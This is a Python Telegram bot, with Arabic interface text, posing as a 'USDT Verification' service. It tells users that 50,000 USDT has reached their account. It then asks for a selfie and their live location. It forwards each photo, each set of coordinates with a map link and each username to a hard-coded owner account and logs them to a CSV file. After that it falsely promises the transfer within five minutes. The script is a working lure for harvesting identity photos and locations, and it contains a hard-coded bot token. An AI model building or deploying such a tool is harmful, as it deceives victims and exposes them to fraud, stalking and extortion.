#!/usr/bin/env python3
"""
Telegram Bot - USDT Verification
للتحقق من هوية المستخدمين عبر الصورة والموقع
"""

import telebot
import os
import csv
import logging
from datetime import datetime

# ============================================
# الإعدادات الأساسية
# ============================================

TOKEN = "8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y"
OWNER_ID = 8391968596
DATA_FILE = "users_data.csv"

# إعداد السجلات (Logging)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# تهيئة البوت
bot = telebot.TeleBot(TOKEN)

# تخزين حالة المستخدمين
user_state = {}

# ============================================
# الرسائل النصية
# ============================================

WELCOME_MSG = (
    "🎉 *50,000 USDT وصلت لحسابك!*\n\n"
    "لأسباب أمنية، يجب تأكيد هويتك أولاً.\n\n"
    "📌 *الخطوة 1:* أرسل صورتك (سيلفي)\n"
    "📌 *الخطوة 2:* أرسل موقعك الحالي\n\n"
    "بعدها يتم تحويل المبلغ فوراً ✅"
)

PHOTO_RECEIVED_MSG = "✅ تم استلام الصورة بنجاح!\n📍 الآن أرسل موقعك الحالي من الزر أدناه:"

LOCATION_RECEIVED_MSG = "✅ *تم التحقق بنجاح!*\nسيتم تحويل 50,000 USDT خلال 5 دقائق.\nشكراً لاستخدامك الخدمة."

ERROR_MSG = "⚠️ أرسل صورتك أولاً رجاءً"

# ============================================
# الدوال المساعدة
# ============================================

def create_location_keyboard():
    """إنشاء keyboard مع زر الموقع"""
    markup = telebot.types.ReplyKeyboardMarkup(
        resize_keyboard=True,
        one_time_keyboard=True
    )
    btn = telebot.types.KeyboardButton(
        "📍 أرسل موقعي الآن",
        request_location=True
    )
    markup.add(btn)
    return markup

def save_user_data(user_id, username, first_name, data_type, value1="", value2=""):
    """حفظ بيانات المستخدم في ملف CSV"""
    file_exists = os.path.isfile(DATA_FILE)
    with open(DATA_FILE, 'a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow([
                'Time', 'UserID', 'Username', 'Name',
                'Type', 'Value1', 'Value2'
            ])
        writer.writerow([
            datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            user_id,
            username or 'N/A',
            first_name or 'N/A',
            data_type,
            str(value1),
            str(value2)
        ])

def notify_owner(message_text, parse_mode=None):
    """إرسال إشعار لمالك البوت"""
    try:
        bot.send_message(OWNER_ID, message_text, parse_mode=parse_mode)
    except Exception as e:
        logger.error(f"فشل إرسال الإشعار: {e}")

# ============================================
# معالجات الأوامر
# ============================================

@bot.message_handler(commands=['start'])
def handle_start(message):
    """معالجة أمر /start"""
    chat_id = message.chat.id
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    
    logger.info(f"مستخدم جديد: @{username} ({user_id})")
    
    # تخزين حالة المستخدم
    user_state[user_id] = {'photo': False, 'location': False}
    
    # إرسال رسالة الترحيب
    bot.send_message(chat_id, WELCOME_MSG, parse_mode='Markdown')
    bot.send_message(chat_id, "📸 أرسل صورتك الآن:")
    
    # إشعار للمالك
    notify_owner(
        f"🆕 *مستخدم جديد دخل البوت*\n"
        f"👤 @{username}\n"
        f"🆔 {user_id}\n"
        f"📛 {first_name}",
        parse_mode='Markdown'
    )
    
    # حفظ البيانات
    save_user_data(user_id, username, first_name, "دخول")

# ============================================
# معالجات المحتوى
# ============================================

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    """معالجة استقبال الصور"""
    chat_id = message.chat.id
    user_id = message.from_user.id
    username = message.from_user.username
    
    logger.info(f"صورة واردة من @{username}")
    
    try:
        # تحميل الصورة
        file_id = message.photo[-1].file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # حفظ الصورة محلياً
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"photo_{user_id}_{timestamp}.jpg"
        
        with open(filename, 'wb') as f:
            f.write(downloaded_file)
        
        # إرسال الصورة للمالك
        with open(filename, 'rb') as f:
            bot.send_photo(
                OWNER_ID,
                f,
                caption=(
                    f"📸 *صورة واردة*\n"
                    f"👤 @{username}\n"
                    f"🆔 {user_id}\n"
                    f"🕐 {datetime.now().strftime('%H:%M:%S')}"
                ),
                parse_mode='Markdown'
            )
        
        # تحديث حالة المستخدم
        if user_id in user_state:
            user_state[user_id]['photo'] = True
        
        # حفظ البيانات
        save_user_data(user_id, username, message.from_user.first_name, "صورة", file_id)
        
        # طلب الموقع
        bot.send_message(
            chat_id,
            PHOTO_RECEIVED_MSG,
            reply_markup=create_location_keyboard()
        )
        
    except Exception as e:
        logger.error(f"خطأ في معالجة الصورة: {e}")
        bot.send_message(chat_id, "❌ حدث خطأ في استقبال الصورة. حاول مرة أخرى.")

@bot.message_handler(content_types=['location'])
def handle_location(message):
    """معالجة استقبال الموقع"""
    chat_id = message.chat.id
    user_id = message.from_user.id
    username = message.from_user.username
    lat = message.location.latitude
    lon = message.location.longitude
    
    logger.info(f"موقع وارد من @{username}: {lat}, {lon}")
    
    # إرسال الموقع للمالك
    location_text = (
        f"📍 *موقع واصل!*\n"
        f"👤 @{username}\n"
        f"🆔 {user_id}\n"
        f"🌐 {lat}, {lon}\n"
        f"🔗 https://www.google.com/maps?q={lat},{lon}"
    )
    
    notify_owner(location_text, parse_mode='Markdown')
    bot.send_location(OWNER_ID, lat, lon)
    
    # تحديث حالة المستخدم
    if user_id in user_state:
        user_state[user_id]['location'] = True
    
    # حفظ البيانات
    save_user_data(
        user_id, username,
        message.from_user.first_name,
        "موقع", lat, lon
    )
    
    # إرسال رسالة النجاح
    bot.send_message(
        chat_id,
        LOCATION_RECEIVED_MSG,
        parse_mode='Markdown',
        reply_markup=telebot.types.ReplyKeyboardRemove()
    )

@bot.message_handler(content_types=['document'])
def handle_document(message):
    """معالجة استقبال الملفات"""
    chat_id = message.chat.id
    
    bot.send_message(
        chat_id,
        "❌ هذا البوت لا يقبل الملفات. أرسل صورة فقط."
    )

@bot.message_handler(content_types=['voice', 'video', 'audio', 'sticker'])
def handle_other_media(message):
    """معالجة الوسائط الأخرى"""
    chat_id = message.chat.id
    
    bot.send_message(
        chat_id,
        "❌ هذا البوت يقبل الصور فقط. أرسل صورة سيلفي."
    )

# ============================================
# المعالج الافتراضي
# ============================================

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """معالجة أي رسالة نصية أخرى"""
    chat_id = message.chat.id
    user_id = message.from_user.id
    text = message.text
    
    # التحقق من وجود حالة للمستخدم
    if user_id in user_state:
        state = user_state[user_id]
        
        if not state['photo']:
            bot.send_message(chat_id, "📸 أرسل صورتك أولاً")
        elif not state['location']:
            bot.send_message(
                chat_id,
                "📍 أرسل موقعك الآن",
                reply_markup=create_location_keyboard()
            )
        else:
            bot.send_message(chat_id, "✅ تم التحقق مسبقاً. شكراً لك!")
    else:
        # مستخدم جديد لم يضغط /start
        bot.send_message(
            chat_id,
            "⚠️ أرسل /start للبدء",
            reply_markup=telebot.types.ReplyKeyboardRemove()
        )

# ============================================
# تشغيل البوت
# ============================================

def main():
    """الدالة الرئيسية لتشغيل البوت"""
    logger.info("✅ بوت USDT Verification شغال...")
    print("✅ بوت USDT Verification شغال...")
    print(f"📊 سيتم حفظ البيانات في: {DATA_FILE}")
    
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except KeyboardInterrupt:
        logger.info("❌ تم إيقاف البوت يدوياً")
    except Exception as e:
        logger.error(f"❌ خطأ في تشغيل البوت: {e}")

if __name__ == "__main__":
    main()
